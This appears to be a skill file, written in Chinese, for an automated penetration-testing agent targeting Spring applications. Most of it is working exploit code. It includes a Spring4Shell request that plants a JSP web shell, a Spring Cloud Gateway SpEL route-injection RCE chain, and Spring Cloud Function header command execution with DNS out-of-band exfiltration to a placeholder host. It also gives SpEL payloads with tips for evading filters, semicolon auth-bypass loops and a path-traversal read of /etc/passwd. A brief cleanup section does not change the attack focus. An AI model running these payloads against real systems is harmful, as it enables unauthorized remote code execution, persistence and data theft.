---
name: framework-spring
description: Spring 生态专项（不是 actuator 枚举，那部分见 hunt-springboot）：Spring4Shell CVE-2022-22965、Spring Cloud Gateway CVE-2022-22947 SpEL、Spring Cloud Function CVE-2022-22963 头注入、Spring SpEL 参数注入、Spring Security 分号路径参数（matrix param）鉴权绕过、Spring Data REST 暴露、Config Server 路径穿越
whenToUse: "Java 栈且指纹为 Spring / Spring Boot / Spring Cloud；URL 出现 /actuator/gateway、/functionRouter；发现 SpEL 可注入点；鉴权可被 ;jsessionid 或 ..; 绕过"
role: vuln-scan
enabled: true
---

# Spring 生态专项

> actuator 全端面枚举（heapdump/env/loggers/H2 console）走 `hunt-springboot`。本技能只覆盖 **CVE 与框架特性绕过**。
> 来源：`knowledge-sources/src-hunter-skill/references/payloader/by-category/web/框架漏洞.md` 第 102–225(Actuator)、329–449(SpEL)、449–554(Spring Cloud) 行。

## 1. 指纹（零风险）

```bash
curl -sI "https://$TARGET/" | grep -iE "x-application-context|server|set-cookie"
curl -s "https://$TARGET/actuator" -o /dev/null -w '%{http_code}\n'
curl -s "https://$TARGET/error" | grep -iE "Whitelabel|springframework"
curl -s "https://$TARGET/" -o /dev/null -w '%{http_code}\n' -X OPTIONS -H "Access-Control-Request-Method: GET"
```

| 信号 | 含义 |
|---|---|
| `X-Application-Context` 头 | Spring Boot |
| Whitelabel Error Page | Spring Boot 默认错误页 |
| `JSESSIONID` cookie | Spring Security 可能性高 |
| `/actuator` 200/401 | actuator 开启 |

## 2. Spring Security 分号绕过（最高性价比，先测）

Spring 的 `PathPattern`/`AntPathMatcher` 会把 `;` 之后当 matrix param **剥掉**，但下游 servlet 容器可能不剥 —— 于是 `/admin;x=1/del` 对 Spring Security 看来是 `/admin`… 反之亦然。两种方向都试：

```bash
# 直接访问受保护路径（基线，应 401/403）
curl -s -o /dev/null -w '%{http_code}\n' "https://$TARGET/admin/users"

# 变体：分号 / 编码分号 / 尾斜杠 / 双斜杠 / ..;/
for p in "/admin/users;.css" "/admin/users%3b.css" "/admin/users/" "//admin/users" \
         "/admin/..;/users" "/admin/users;jsessionid=x" "/;/admin/users" "/admin/users%00"; do
  printf '%-28s ' "$p"
  curl -s -o /dev/null -w '%{http_code}\n' "https://$TARGET$p"
done
```

**判据**：基线 401/403，某个变体返回 200 且含业务数据 → 鉴权绕过，**High/Critical**。
同类变体还有：大小写（`/Admin/users`）、`%2e%2e`、`..%2f`、`/admin/users.json`（后缀匹配放行）。

## 3. Spring4Shell（CVE-2022-22965）

前提：Spring Framework < 5.3.18 + **Tomcat**（war 部署，非内嵌 jar）+ JDK9+ + 存在 POJO 数据绑定入口。

```http
POST /?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
```
随后 `GET /tomcatwar.jsp?pwd=j&cmd=id`。

**先做无害探测**：只发 `class.module.classLoader.` 前缀，观察是否 400/500 出现 `Invalid property 'classLoader'` —— 有该报错说明可绑，再上完整链。

## 4. Spring Cloud Gateway（CVE-2022-22947）

```bash
# 1) 加恶意路由
curl -s -X POST "https://$TARGET/actuator/gateway/routes/hack" \
  -H "Content-Type: application/json" -d '{
  "id":"hack",
  "filters":[{"name":"AddResponseHeader","args":{
    "name":"Result",
    "value":"#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"
  }}],
  "uri":"http://example.com"}'

# 2) 刷新
curl -s -X POST "https://$TARGET/actuator/gateway/refresh"

# 3) 读结果
curl -s "https://$TARGET/actuator/gateway/routes/hack" | grep -o 'Result[^"]*'

# 4) 清理（必须做）
curl -s -X DELETE "https://$TARGET/actuator/gateway/routes/hack" && curl -s -X POST "https://$TARGET/actuator/gateway/refresh"
```
**必须清理**：这条路由是**写入目标配置**的，不删会留后门。测完立刻 DELETE + refresh。

## 5. Spring Cloud Function（CVE-2022-22963）

```bash
curl -s -X POST "https://$TARGET/functionRouter" \
  -H "spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(\"id\")" \
  -H "Content-Type: text/plain" -d "payload"
```
无回显 → 换 DNS 外带：
```
spring.cloud.function.routing-expression: new java.net.URL("http://OAST_DOMAIN/"+T(java.lang.Runtime).getRuntime().exec("whoami")).openConnection().getInputStream()
```

## 6. Spring SpEL 参数注入

可疑点：搜索/排序/模板/邮件模板/表达式配置字段。探测：

```
#{7*7}          → 返回 49 = 可求值
${7*7}
T(java.lang.System).getProperty('user.name')
```

命令执行（无回显时用 Scanner 读流）：
```
#{new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).useDelimiter("\\A").next()}
```
绕过关键字过滤：`"java.la"+"ng.Runtime"` 字符串拼接 + 反射。

## 7. 其它

| 目标 | payload |
|---|---|
| Config Server 路径穿越 CVE-2020-5410 | `GET /..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd` |
| Spring Data REST | `GET /profile`、`GET /` 看 `_links`，找 `{?page}` 暴露的 repository |
| Eureka SSRF | `POST /eureka/apps` 配置 serviceUrl 指内网 |

## 纪律

- Gateway 路由、Spring4Shell 写文件都是**目标侧持久化变更**：先算术探测，确认再上；上完立刻清理，报告里写清"已清理"
- 只用 `id`/`whoami`，不读业务库、不留 shell
- 分号绕过是纯读，性价比最高，永远先跑
